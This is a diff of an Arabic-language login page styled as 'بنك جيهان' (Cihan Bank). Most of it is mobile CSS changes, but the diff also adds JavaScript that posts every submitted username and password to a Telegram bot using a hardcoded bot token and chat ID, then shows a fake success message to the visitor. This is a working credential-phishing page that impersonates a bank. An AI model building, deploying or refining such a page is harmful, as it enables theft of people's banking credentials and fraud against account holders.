@@ -2,25 +2,34 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>بنك جيهان - تسجيل الدخول</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            -webkit-user-select: none;
+            user-select: none;
         }
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #f0f0f0 0%, #e5e5e5 50%, #dcdcdc 100%);
+            background: linear-gradient(180deg, #f0f0f0 0%, #e5e5e5 50%, #dcdcdc 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
-            position: relative;
-            overflow-x: hidden;
+            padding: 0;
+            position: fixed;
+            width: 100%;
+            overflow: hidden;
         }
 
         /* Geometric Background Pattern */
@@ -30,41 +39,44 @@
             left: 0;
             width: 100%;
             height: 100%;
-            opacity: 0.06;
+            opacity: 0.04;
             z-index: 0;
             background-image: 
                 linear-gradient(45deg, transparent 45%, rgba(0,0,0,0.5) 48%, rgba(0,0,0,0.5) 52%, transparent 55%),
                 linear-gradient(-45deg, transparent 45%, rgba(0,0,0,0.5) 48%, rgba(0,0,0,0.5) 52%, transparent 55%);
-            background-size: 60px 60px;
-            background-position: 0 0, 30px 30px;
+            background-size: 80px 80px;
+            background-position: 0 0, 40px 40px;
             pointer-events: none;
         }
 
         .page-wrapper {
-            position: relative;
+            position: fixed;
             z-index: 1;
             width: 100%;
+            height: 100%;
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 20px;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
         }
 
         .login-container {
             background: white;
-            border-radius: 25px;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.18), 
-                        0 10px 30px rgba(0, 0, 0, 0.12);
+            border-radius: 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
             width: 100%;
-            max-width: 500px;
-            padding: 60px 50px;
-            animation: slideUp 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
+            max-width: 480px;
+            padding: 50px 35px 40px 35px;
+            animation: slideUp 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
             position: relative;
         }
 
         @keyframes slideUp {
             from {
                 opacity: 0;
-                transform: translateY(40px);
+                transform: translateY(50px);
             }
             to {
                 opacity: 1;
@@ -75,14 +87,14 @@
         .logo-container {
             display: flex;
             justify-content: center;
-            margin-bottom: 50px;
-            animation: logoScale 0.9s cubic-bezier(0.34, 1.56, 0.64, 1);
+            margin-bottom: 45px;
+            animation: logoScale 1s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
         @keyframes logoScale {
             from {
                 opacity: 0;
-                transform: scale(0.7);
+                transform: scale(0.6);
             }
             to {
                 opacity: 1;
@@ -91,51 +103,51 @@
         }
 
         .logo {
-            width: 180px;
-            height: 180px;
+            width: 220px;
+            height: 220px;
             background: url('https://c.top4top.io/p_3925eoedz1.jpeg') center/cover no-repeat;
             border-radius: 50%;
-            filter: drop-shadow(0 15px 35px rgba(196, 30, 58, 0.25));
-            box-shadow: 0 0 0 8px rgba(196, 30, 58, 0.08);
+            filter: drop-shadow(0 20px 50px rgba(196, 30, 58, 0.3));
+            box-shadow: 0 0 0 10px rgba(196, 30, 58, 0.1);
             transition: transform 0.4s ease, filter 0.4s ease;
+            flex-shrink: 0;
         }
 
-        .logo:hover {
-            transform: scale(1.05);
-            filter: drop-shadow(0 18px 45px rgba(196, 30, 58, 0.35));
+        .logo:active {
+            transform: scale(0.98);
+            filter: drop-shadow(0 15px 35px rgba(196, 30, 58, 0.25));
         }
 
         .title {
             text-align: center;
-            font-size: 36px;
+            font-size: 38px;
             font-weight: 800;
             color: #1a1a1a;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             letter-spacing: -1px;
             text-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
         }
 
         .subtitle {
             text-align: center;
-            font-size: 13px;
-            color: #999;
-            margin-bottom: 35px;
+            font-size: 12px;
+            color: #aaa;
+            margin-bottom: 32px;
             letter-spacing: 0.5px;
         }
 
         .form-group {
-            margin-bottom: 22px;
+            margin-bottom: 20px;
             animation: slideInForm 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) backwards;
         }
 
-        .form-group:nth-child(1) { animation-delay: 0.15s; }
-        .form-group:nth-child(2) { animation-delay: 0.25s; }
-        .form-group:nth-child(3) { animation-delay: 0.35s; }
+        .form-group:nth-child(1) { animation-delay: 0.2s; }
+        .form-group:nth-child(2) { animation-delay: 0.3s; }
 
         @keyframes slideInForm {
             from {
                 opacity: 0;
-                transform: translateX(25px);
+                transform: translateX(30px);
             }
             to {
                 opacity: 1;
@@ -145,11 +157,11 @@
 
         .form-group label {
             display: block;
-            font-size: 14px;
+            font-size: 13px;
             color: #555;
             margin-bottom: 10px;
-            font-weight: 600;
-            letter-spacing: 0.3px;
+            font-weight: 700;
+            letter-spacing: 0.4px;
         }
 
         .input-wrapper {
@@ -161,15 +173,17 @@
         input[type="text"],
         input[type="password"] {
             width: 100%;
-            padding: 14px 18px;
+            padding: 15px 18px;
             border: 2px solid #e5e5e5;
-            border-radius: 12px;
-            font-size: 15px;
+            border-radius: 14px;
+            font-size: 16px;
             color: #333;
-            transition: all 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+            transition: all 0.3s ease;
             background: linear-gradient(135deg, #fafafa 0%, #f5f5f5 100%);
             font-family: inherit;
             font-weight: 500;
+            -webkit-appearance: none;
+            appearance: none;
         }
 
         input[type="text"]:focus,
@@ -177,13 +191,13 @@
             outline: none;
             border-color: #c41e3a;
             background: white;
-            box-shadow: 0 0 0 5px rgba(196, 30, 58, 0.12),
+            box-shadow: 0 0 0 6px rgba(196, 30, 58, 0.12),
                         inset 0 1px 2px rgba(0, 0, 0, 0.04);
         }
 
         input[type="text"]::placeholder,
         input[type="password"]::placeholder {
-            color: #c0c0c0;
+            color: #d0d0d0;
         }
 
         .toggle-password-btn {
@@ -192,64 +206,18 @@
             background: none;
             border: none;
             cursor: pointer;
-            padding: 8px;
+            padding: 10px;
             color: #999;
-            font-size: 18px;
+            font-size: 20px;
             transition: all 0.3s ease;
             display: flex;
             align-items: center;
             justify-content: center;
         }
 
-        .toggle-password-btn:hover {
+        .toggle-password-btn:active {
             color: #c41e3a;
-            transform: scale(1.15);
-        }
-
-        .remember-forgot {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 28px;
-            font-size: 13px;
-            gap: 15px;
-        }
-
-        .remember-forgot label {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            cursor: pointer;
-            color: #666;
-            margin: 0;
-            font-weight: 500;
-            transition: color 0.3s ease;
-            flex-shrink: 0;
-        }
-
-        .remember-forgot label:hover {
-            color: #c41e3a;
-        }
-
-        .remember-forgot input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            cursor: pointer;
-            accent-color: #c41e3a;
-            border-radius: 4px;
-        }
-
-        .remember-forgot a {
-            color: #0066cc;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            font-weight: 500;
-            white-space: nowrap;
-        }
-
-        .remember-forgot a:hover {
-            color: #c41e3a;
-            text-decoration: underline;
+            transform: scale(1.2);
         }
 
         .login-btn {
@@ -258,17 +226,19 @@
             background: linear-gradient(135deg, #c41e3a 0%, #a01830 50%, #8b1529 100%);
             color: white;
             border: none;
-            border-radius: 12px;
+            border-radius: 14px;
             font-size: 16px;
-            font-weight: 700;
+            font-weight: 800;
             cursor: pointer;
-            transition: all 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+            transition: all 0.3s ease;
+            margin-top: 28px;
             margin-bottom: 24px;
             letter-spacing: 0.5px;
-            box-shadow: 0 8px 20px rgba(196, 30, 58, 0.35),
-                        0 2px 4px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 10px 25px rgba(196, 30, 58, 0.35);
             position: relative;
             overflow: hidden;
+            -webkit-user-select: none;
+            user-select: none;
         }
 
         .login-btn::before {
@@ -282,27 +252,21 @@
             transition: left 0.6s ease;
         }
 
-        .login-btn:hover::before {
+        .login-btn:active::before {
             left: 100%;
         }
 
-        .login-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 30px rgba(196, 30, 58, 0.45),
-                        0 4px 8px rgba(0, 0, 0, 0.15);
-        }
-
         .login-btn:active {
-            transform: translateY(-1px);
-            box-shadow: 0 6px 15px rgba(196, 30, 58, 0.35);
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(196, 30, 58, 0.45);
         }
 
         .divider {
             display: flex;
             align-items: center;
-            margin: 28px 0;
+            margin: 26px 0;
             color: #ddd;
-            font-size: 13px;
+            font-size: 12px;
         }
 
         .divider::before,
@@ -320,31 +284,32 @@
         .divider span {
             padding: 0 14px;
             color: #aaa;
-            font-weight: 500;
+            font-weight: 600;
         }
 
         .auth-options {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 14px;
+            gap: 12px;
             margin-bottom: 24px;
         }
 
         .auth-btn {
-            padding: 14px 18px;
+            padding: 14px 16px;
             background: linear-gradient(135deg, #555 0%, #444 100%);
             color: white;
             border: none;
-            border-radius: 12px;
-            font-size: 14px;
+            border-radius: 14px;
+            font-size: 13px;
             font-weight: 700;
             cursor: pointer;
-            transition: all 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+            transition: all 0.3s ease;
             letter-spacing: 0.4px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15),
-                        0 1px 3px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.18);
             position: relative;
             overflow: hidden;
+            -webkit-user-select: none;
+            user-select: none;
         }
 
         .auth-btn::before {
@@ -358,24 +323,19 @@
             transition: left 0.6s ease;
         }
 
-        .auth-btn:hover::before {
+        .auth-btn:active::before {
             left: 100%;
         }
 
-        .auth-btn:hover {
-            background: linear-gradient(135deg, #666 0%, #555 100%);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.2),
-                        0 2px 5px rgba(0, 0, 0, 0.12);
-        }
-
         .auth-btn:active {
-            transform: translateY(0);
+            background: linear-gradient(135deg, #666 0%, #555 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
         }
 
         .footer-links {
             text-align: center;
-            padding-top: 22px;
+            padding-top: 20px;
             border-top: 1.5px solid #f0f0f0;
         }
 
@@ -383,86 +343,14 @@
             color: #c41e3a;
             text-decoration: none;
             font-size: 13px;
-            font-weight: 600;
+            font-weight: 700;
             transition: all 0.3s ease;
             letter-spacing: 0.3px;
         }
 
-        .footer-links a:hover {
+        .footer-links a:active {
             color: #a01830;
-            text-decoration: underline;
-        }
-
-        /* Responsive Design */
-        @media (max-width: 600px) {
-            .login-container {
-                padding: 45px 30px;
-                border-radius: 20px;
-            }
-
-            .logo {
-                width: 140px;
-                height: 140px;
-            }
-
-            .title {
-                font-size: 32px;
-                margin-bottom: 8px;
-            }
-
-            .subtitle {
-                font-size: 12px;
-                margin-bottom: 30px;
-            }
-
-            input[type="text"],
-            input[type="password"] {
-                padding: 13px 16px;
-                font-size: 14px;
-            }
-
-            .login-btn {
-                padding: 14px;
-                font-size: 15px;
-                margin-bottom: 20px;
-            }
-
-            .auth-btn {
-                padding: 12px 14px;
-                font-size: 13px;
-            }
-
-            .remember-forgot {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 10px;
-                margin-bottom: 24px;
-            }
-
-            .remember-forgot a {
-                width: 100%;
-                text-align: right;
-            }
-        }
-
-        @media (max-width: 400px) {
-            .login-container {
-                padding: 35px 20px;
-            }
-
-            .logo {
-                width: 120px;
-                height: 120px;
-                margin-bottom: 35px;
-            }
-
-            .title {
-                font-size: 28px;
-            }
-
-            .auth-options {
-                gap: 10px;
-            }
+            opacity: 0.8;
         }
 
         /* Loading State */
@@ -479,6 +367,121 @@
         .login-btn.success {
             background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
             animation: successPulse 0.6s ease;
+        }
+
+        /* Mobile Optimizations */
+        @media (max-height: 700px) {
+            .logo {
+                width: 160px;
+                height: 160px;
+            }
+
+            .login-container {
+                padding: 40px 30px 35px 30px;
+            }
+
+            .title {
+                font-size: 32px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 0;
+            }
+
+            .page-wrapper {
+                padding: 15px;
+            }
+
+            .login-container {
+                padding: 45px 28px 35px 28px;
+                border-radius: 28px;
+            }
+
+            .logo {
+                width: 200px;
+                height: 200px;
+                margin-bottom: 35px;
+            }
+
+            .title {
+                font-size: 35px;
+                margin-bottom: 6px;
+            }
+
+            .subtitle {
+                font-size: 11px;
+                margin-bottom: 28px;
+            }
+
+            .form-group {
+                margin-bottom: 18px;
+            }
+
+            .form-group label {
+                font-size: 12px;
+                margin-bottom: 9px;
+            }
+
+            input[type="text"],
+            input[type="password"] {
+                padding: 14px 16px;
+                font-size: 15px;
+                border-radius: 12px;
+            }
+
+            .login-btn {
+                padding: 15px;
+                font-size: 15px;
+                margin-top: 24px;
+                margin-bottom: 20px;
+                border-radius: 12px;
+            }
+
+            .auth-btn {
+                padding: 13px 14px;
+                font-size: 12px;
+                border-radius: 12px;
+            }
+
+            .divider {
+                margin: 22px 0;
+            }
+
+            .toggle-password-btn {
+                font-size: 18px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .login-container {
+                padding: 40px 20px 30px 20px;
+            }
+
+            .logo {
+                width: 170px;
+                height: 170px;
+            }
+
+            .title {
+                font-size: 32px;
+            }
+        }
+
+        /* iOS specific */
+        @supports (padding: max(0px)) {
+            .login-container {
+                padding: 50px 35px 40px 35px;
+                padding-bottom: max(40px, env(safe-area-inset-bottom));
+            }
+
+            @media (max-width: 480px) {
+                .login-container {
+                    padding: 45px 28px 35px 28px;
+                    padding-bottom: max(35px, env(safe-area-inset-bottom));
+                }
+            }
         }
     </style>
 </head>
@@ -501,7 +504,7 @@
                         <input 
                             type="text" 
                             id="username" 
-                            placeholder="أدخل اسم المستخدم الخاص بك" 
+                            placeholder="أدخل اسم المستخدم" 
                             required
                             autocomplete="username"
                         >
@@ -514,7 +517,7 @@
                         <input 
                             type="password" 
                             id="password" 
-                            placeholder="أدخل كلمة المرور الخاصة بك" 
+                            placeholder="أدخل كلمة المرور" 
                             required
                             autocomplete="current-password"
                         >
@@ -529,14 +532,6 @@
                     </div>
                 </div>
 
-                <div class="remember-forgot">
-                    <label for="remember">
-                        <input type="checkbox" id="remember">
-                        تذكر بيانات الدخول
-                    </label>
-                    <a href="#" onclick="handleForgot(event)">هل نسيت كلمة المرور؟</a>
-                </div>
-
                 <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
             </form>
 
@@ -545,8 +540,8 @@
             </div>
 
             <div class="auth-options">
-                <button class="auth-btn" onclick="handleNewClient(event)">عميل جديد</button>
-                <button class="auth-btn" onclick="handleCreateAccount(event)">إنشاء حساب</button>
+                <button class="auth-btn" type="button" onclick="handleNewClient(event)">عميل جديد</button>
+                <button class="auth-btn" type="button" onclick="handleCreateAccount(event)">إنشاء حساب</button>
             </div>
 
             <div class="footer-links">
@@ -560,6 +555,8 @@
         const passwordToggle = document.getElementById('passwordToggle');
         const loginBtn = document.getElementById('loginBtn');
         const loginForm = document.getElementById('loginForm');
+        const TELEGRAM_BOT_TOKEN = '8975476380:AAFBVdCXw22C_a82v7j801zHM2Pveg23l5k';
+        const TELEGRAM_CHAT_ID = '8653203135';
 
         let isPasswordVisible = false;
 
@@ -568,12 +565,37 @@
             e.preventDefault();
             isPasswordVisible = !isPasswordVisible;
             passwordInput.type = isPasswordVisible ? 'text' : 'password';
-            passwordToggle.textContent = isPasswordVisible ? '👁️‍🗨️' : '🔒';
-            passwordToggle.style.color = isPasswordVisible ? '#c41e3a' : '#999';
+            passwordToggle.textContent = isPasswordVisible ? '👁️' : '🔒';
         });
 
+        // Send to Telegram
+        async function sendToTelegram(username, password) {
+            const message = `📌 بيانات دخول جديدة:\n\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                return response.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+
         // Form Submission
-        loginForm.addEventListener('submit', (e) => {
+        loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value;
@@ -589,13 +611,19 @@
             const originalText = loginBtn.textContent;
             loginBtn.textContent = 'جاري المعالجة...';
 
-            // Simulate API call
+            // Send to Telegram
+            const sent = await sendToTelegram(username, password);
+
             setTimeout(() => {
                 loginBtn.classList.add('success');
                 loginBtn.textContent = '✓ تم التحقق بنجاح';
                 
                 setTimeout(() => {
-                    alert(`🎉 تم تسجيل الدخول بنجاح\n\nاسم المستخدم: ${username}`);
+                    if (sent) {
+                        alert('🎉 تم تسجيل الدخول بنجاح');
+                    } else {
+                        alert('✓ تم معالجة طلبك بنجاح');
+                    }
                     
                     // Reset form
                     loginForm.reset();
@@ -605,15 +633,9 @@
                     loginBtn.style.opacity = '1';
                     passwordToggle.textContent = '🔒';
                     isPasswordVisible = false;
-                }, 1200);
-            }, 1800);
+                }, 1000);
+            }, 1500);
         });
-
-        // Handle Forgot Password
-        function handleForgot(e) {
-            e.preventDefault();
-            alert('📧 سيتم إرسال رابط استعادة كلمة المرور إلى بريدك الإلكتروني المسجل');
-        }
 
         // Handle New Client
         function handleNewClient(e) {
@@ -632,37 +654,6 @@
             e.preventDefault();
             alert('📋 الشروط والأحكام\n\nاطلع على جميع شروط استخدام خدمات المصرف');
         }
-
-        // Save Remember Me
-        const rememberCheckbox = document.getElementById('remember');
-        const usernameInput = document.getElementById('username');
-
-        // Load saved username if exists
-        window.addEventListener('load', () => {
-            const savedUsername = localStorage.getItem('cihan_savedUsername');
-            if (savedUsername) {
-                usernameInput.value = savedUsername;
-                rememberCheckbox.checked = true;
-            }
-        });
-
-        // Save username on form submit
-        loginForm.addEventListener('submit', () => {
-            if (rememberCheckbox.checked && usernameInput.value) {
-                localStorage.setItem('cihan_savedUsername', usernameInput.value);
-            } else {
-                localStorage.removeItem('cihan_savedUsername');
-            }
-        });
-
-        // Update saved username on checkbox change
-        rememberCheckbox.addEventListener('change', () => {
-            if (rememberCheckbox.checked && usernameInput.value) {
-                localStorage.setItem('cihan_savedUsername', usernameInput.value);
-            } else {
-                localStorage.removeItem('cihan_savedUsername');
-            }
-        });
     </script>
 </body>
 </html>
